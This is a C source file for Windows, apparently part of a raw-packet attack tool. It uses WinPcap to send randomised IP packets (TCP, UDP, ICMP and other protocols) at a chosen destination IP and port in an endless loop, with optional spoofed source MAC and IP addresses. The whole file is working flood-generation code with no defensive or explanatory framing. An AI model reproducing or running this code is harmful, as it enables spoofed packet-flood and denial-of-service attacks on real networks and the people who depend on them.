
/*
 * ^rand.c
 * */

#include <windows.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <stdlib.h>

#include "pcap.h"
#include "Packet32.h"
#include "Ntddndis.h"

#include "pub.h"
#include "misc.h"
#include "rand.h"

/****************************************************************************/

int do_rand(struct sf_task *task, unsigned char *buf, unsigned int pad) 
{
	unsigned int ipl = 0, iphl = 0, len = 0;
	unsigned char *ip = buf + 14 + pad, ipla[2];
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];
	int ind, i; 
	signed int n;

	for (ind = 0; ; ind++) {
		if (/*159999*//**/100/**/ < ind) 
			ind = 0;

		switch (WaitForSingleObject(task->stop, 0)) {
		case WAIT_TIMEOUT:
			win_ndebug("timeout");
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}

		if (task->fake) {
			buf[8] = (0xff * rand()) / RAND_MAX;
			buf[9] = (0xff * rand()) / RAND_MAX;
			buf[10] = (0xff * rand()) / RAND_MAX;
			buf[11] = (0xff * rand()) / RAND_MAX;
		}

		ip[2] = (0x05 * rand()) / RAND_MAX;
		ip[3] = (0xff * rand()) / RAND_MAX;
		if (0x05 == ip[2] && 0xdc < ip[3])
			ip[3] = 0xdc;
		ip[3] &= 0xfc;
		ipla[0] = ip[2];
		ipla[1] = ip[3];
		ipl = (ip[2] << 8) + ip[3];
		len = 14 + pad + ipl;

		for (i = 0; ipl > i; i++)
			ip[i] = (0xff * rand()) / RAND_MAX;

		ip[0] = 0x40 + (ip[0] & 0x0f);
		if (0x45 > ip[0])
			ip[0] += 0x05;
		ip[2] = ipla[0];
		ip[3] = ipla[1];
		iphl = (ip[0] & 0x0f) * 4;

		if (0 != (ind % 9)) {
			ip[1] &= 0xfc;
			ip[6] &= 0x00/*0x7f*/;
			ip[7] = 0x00;

			if (task->fake) {
				ip[12] = (task->lnet[0] | 
					(task->rmark[0] & ip[12]));
				ip[13] = (task->lnet[1] | 
					(task->rmark[1] & ip[13]));
				ip[14] = (task->lnet[2] | 
					(task->rmark[2] & ip[14]));
				ip[15] = (task->lnet[3] | 
					(task->rmark[3] & ip[15]));
			} else
				memcpy(ip + 12, task->lip, 4);

			if (TYPE_UNIT == task->type || 
				TYPE_UNIU == task->type) {
				memcpy(ip + 16, task->dip, 4);
				ip[9] = task->type;
				if ((task->dport[0] || task->dport[1]) &&
					(ipl - iphl > 20)) {
					ip[iphl + 2] = task->dport[0];
					ip[iphl + 3] = task->dport[1];
				}
			} else if (TYPE_UNIA == task->type || 
				TYPE_VUNIA == task->type)
				memcpy(ip + 16, task->dip, 4);
			else if (TYPE_UNII == task->type) {
				ip[9] = 0x04;
				memcpy(ip + 16, task->dip, 4);
			} else if (TYPE_UNIO == task->type) {
				ip[9] = 0x06;
				memcpy(ip + 16, task->dip, 4);
			}
				
			switch (ip[9] % 7) {
			case 0:
			case 1:
				win_ndebug("tcp");
				ip[9] = 0x06;
				if (ipl > iphl + 20) 
					do_csum(ip, ip + 10, iphl, 
						ip + iphl, ip + iphl + 16, 
						ipl - iphl, 1);
				else
					do_csum(ip, ip + 10, iphl, 0, 0, 0, 0); 
				break;
			case 2:
			case 3:
				ip[9] = 0x11;
				if (ipl > iphl + 20)
					do_csum(ip, ip + 10, iphl, ip + iphl,
						ip + iphl + 6, ipl - iphl, 1);
				else
					do_csum(ip, ip + 10, iphl, 0, 0, 0, 0); 
				break;
			case 4:
			case 5:
				win_ndebug("icmp");
				ip[9] = 0x01;
				if (ipl > iphl + 4)
					do_csum(ip, ip + 10, iphl, ip + iphl,
						ip + iphl + 2, ipl - iphl, 0);
				else
					do_csum(ip, ip + 10, iphl, 0, 0, 0, 0); 
				break;
			case 6:
				do {
					ip[9] = (0xff * rand()) / RAND_MAX;
				} while	(0x01 == ip[9] || 0x06 == ip[9] ||
					0x11 == ip[9]);

				do_csum(ip, ip + 10, iphl, 0, 0, 0, 0); 
				break;
			}
		} else if (iphl < ipl) {
			if (TYPE_UNIT == task->type) 
				ip[9] = 0x06;
			else if (TYPE_UNIU == task->type) 
				ip[9] = 0x11;
			else if (TYPE_UNII == task->type)
				ip[9] = 0x01;

			switch (ip[9]) {
			case 0x06:
				do_csum(ip, ip + 10, iphl, ip + iphl,
					ip + iphl + 16, ipl - iphl, 1);
				break;
			case 0x11:
				do_csum(ip, ip + 10, iphl, ip + iphl,
					ip + iphl + 6, ipl - iphl, 1);
				break;
			case 0x01:
				do_csum(ip, ip + 10, iphl, ip + iphl,
					ip + iphl + 2, ipl - iphl, 0);
				break;
			default:
				do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);
				break;
			}
		}

		if (0 >= (n = spy_kernel(task, buf, len, arpip)))
			return abs(n);
	}
}

/*
 * rand.c$
 * */

